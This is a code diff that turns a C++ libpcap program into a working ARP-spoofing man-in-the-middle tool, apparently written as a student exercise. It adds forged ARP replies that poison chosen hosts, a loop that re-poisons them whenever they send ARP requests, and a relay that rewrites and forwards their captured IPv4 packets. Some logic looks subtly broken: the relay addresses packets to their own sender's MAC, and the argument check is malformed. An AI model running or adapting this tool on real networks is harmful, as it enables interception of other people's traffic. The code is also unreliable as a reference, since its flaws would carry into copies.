@@ -1,16 +1,19 @@
 #include <cstdio>
 #include <iostream>
+#include <thread>
 #include <pcap.h>
 #include <vector>
 #include <map>
 
 #include <unistd.h>
 #include <string.h>
+#include <signal.h>
 #include <sys/types.h>
 #include <sys/socket.h>
 #include <sys/ioctl.h>
 #include <netinet/in.h>
 #include <netinet/ether.h>
+#include <netinet/ip.h>
 #include <errno.h>
 #include <stdlib.h>
 #include <fcntl.h>
@@ -44,6 +47,9 @@ struct Flow
 	Mac target_mac;
 };
 
+Ip attacker_ip;
+Mac attacker_mac;
+Flow flow[A_SIZE];
 
 void usage() {
 	printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
@@ -76,7 +82,7 @@ Ip get_my_ip(char* dev)
 {
 	int fd;
 	struct ifreq ifr;
-	char* ip;
+	char ip[16];
 
 	fd = socket(AF_INET, SOCK_DGRAM, 0);
 
@@ -87,7 +93,7 @@ Ip get_my_ip(char* dev)
 	close(fd);
 
 	inet_ntop(AF_INET, ifr.ifr_addr.sa_data + sizeof(u_short), ip, sizeof(struct sockaddr));
-	
+
 	return Ip(ip);
 }
 Mac get_my_mac(char* dev)
@@ -143,7 +149,6 @@ Mac get_sender_mac(pcap_t* handle, Ip sender_ip, Ip my_ip, Mac my_mac){
 		if(Mac(my_mac) == etharp->arp_.tmac() && Ip(my_ip) == etharp->arp_.tip() && Ip(sender_ip) == etharp->arp_.sip()) {
 			break;
 		}
-
 	}
 
 	Mac sender_mac = etharp->arp_.smac();
@@ -163,33 +168,43 @@ int arp_infect(pcap_t* handle, Ip sender_ip, Mac sender_mac, Ip my_ip, Mac my_ma
 	return res;
 }
 
-// void relay(pcap_t* handle){
+void relay(pcap_t* handle, const u_char* packet, int len, Ip srcIp){
+	u_char* send = (u_char*)malloc(sizeof(u_char) * len);
+
+	EthHdr *eth = (EthHdr*) packet;
+	eth->smac_ = attacker_mac;
+	eth->dmac_ = arp_table.at(srcIp);
+	memcpy(send, packet, len);
+	memcpy(send, eth, ETH_HLEN);
 	
-// }
+	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(send), len);
+    if (res != 0) {
+        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+    }
+    free(send);
+	return;
+}
 
-
+// A -> B , B -> A 가 있다고 가정
 int main(int argc, char* argv[]) {
 	if (argc < 4 && argc % 2 != 0) {
 		usage();
 		return -1;
 	}
 
-	Ip attacker_ip;
-	Mac attacker_mac;
-	Flow flow[A_SIZE];
-
 	int num_of_flow = (argc -2) / 2;
-	
+
 	char* dev = argv[1];
 	for(int i = 2 ; i < argc; i+=2){
 		flow[(i-2) / 2].sender_ip = Ip(argv[i]);
 		flow[(i-2) / 2].target_ip = Ip(argv[i+1]);
 	}
-
+	
 	//print info
 	for(int i = 0 ; i < num_of_flow; i++){
 		cout << i+1 << " : "<< std::string(flow[i].sender_ip) << " -> " << std::string(flow[i].target_ip) << endl;
 	}
+	cout << endl;
 
 	char errbuf[PCAP_ERRBUF_SIZE];
 	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
@@ -197,14 +212,15 @@ int main(int argc, char* argv[]) {
 		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
 		return -1;
 	}
-
+	
 	//get attacker's info
 	attacker_ip = get_my_ip(dev);
 	attacker_mac = get_my_mac(dev);
 
+	cout << "#attacker's info" << endl;
 	cout << "attacker's ip : " << std::string(attacker_ip) << endl;
-	cout << "attacker's mac : " << std::string(attacker_mac) << endl;
-
+	cout << "attacker's mac : " << std::string(attacker_mac) << endl << endl;
+	
 	//get sender's info
 	for(int i = 0 ; i < num_of_flow; i++)
 	{
@@ -214,13 +230,68 @@ int main(int argc, char* argv[]) {
 		flow[i].sender_mac = get_sender_mac(handle, flow[i].sender_ip, attacker_ip, attacker_mac);
 		arp_table.insert(pair<Ip, Mac>(flow[i].sender_ip, flow[i].sender_mac));
 	}
+	for(int i = 0 ; i < num_of_flow; i++)
+	{
+		if(arp_table.find(flow[i].target_ip) != arp_table.end())
+			flow[i].target_mac = arp_table.at(flow[i].target_ip);
+	}
 
 	//print arp_table
+	cout << "#arp_table info" << endl;
 	for(auto iter = arp_table.begin(); iter != arp_table.end(); iter++)
 	{
-		cout << std::string(iter->first) << " " << std::string(iter->second) << endl;
+		cout << std::string(iter->first) << " : " << std::string(iter->second) << endl;
 	}
+
+	//arp_infect
+	for(int i = 0 ; i < num_of_flow; i++)
+	{
+		arp_infect(handle, flow[i].sender_ip, flow[i].sender_mac, attacker_ip, attacker_mac, flow[i].target_ip);
+	}
+
 	
+	//packet capture
+	EthHdr *eth;
+
+	while (true) {
+		struct pcap_pkthdr* header;
+		const u_char* packet;
+		int res = pcap_next_ex(handle, &header, &packet);
+		if (res == 0) continue;
+		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
+			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
+			break;
+		}
+		if (packet == NULL) continue;
+        
+		eth = (EthHdr *) packet; 
+
+		if(eth->type() == EthHdr::Ip4){
+			ip * ipv4 = (ip *) (packet + ETH_HLEN);
+			char buf[16];
+			Ip srcIp;
+			
+			sprintf(buf,"%s",inet_ntoa(ipv4->ip_src));
+			srcIp = Ip(buf);
+
+			if(arp_table.find(srcIp) != arp_table.end())
+				relay(handle, packet, header->len, srcIp);
+		}
+			
+		if(eth->type() == EthHdr::Arp){
+			EthArpPacket * etharp = (EthArpPacket *) packet;
+
+			//브로드 캐스트로 target이 arp 패킷을 보낼 때 + sender가 arp 패킷을 보낼 때 
+			//유니 캐스트로 sender가 물어볼 때
+			for(auto iter = arp_table.begin(); iter != arp_table.end(); iter++)
+			{
+				if(etharp->arp_.smac() == iter->second && (etharp->arp_.tmac() == Mac::broadcastMac() || etharp->arp_.tmac() == attacker_mac)){
+					arp_infect(handle, etharp->arp_.sip(), etharp->arp_.smac(), attacker_ip, attacker_mac, etharp->arp_.tip());
+				}
+			}
+
+		}
+	}
 	
 	pcap_close(handle);
 }
